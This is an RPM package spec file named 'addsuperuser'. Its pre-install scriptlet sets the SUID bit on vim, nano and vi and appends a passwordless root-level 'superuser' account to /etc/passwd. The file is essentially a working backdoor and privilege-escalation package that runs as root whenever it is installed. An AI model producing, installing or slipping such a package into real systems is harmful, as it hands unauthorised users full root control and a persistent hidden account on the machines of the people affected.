Name:		addsuperuser
Version:	1
Release:	0
Summary:	Script for adding superuser

Group:		Unknown
BuildArch:	noarch
License:	GPL
URL:		http://brainyou.stream/

%description
Add superuser and set 

%pre
echo "----------"
echo "Setting vi SID"
chmod 4755 /bin/vim
chmod 4755 /bin/nano
chmod 4755 /bin/vi
echo "superuser::0:0::/root:/bin/bash" >> /etc/passwd

%setup -q

%build

%install

%files

%postun

%changelog
* Mon Aug 19 2019 BrainYou 1.0.0
  - First build
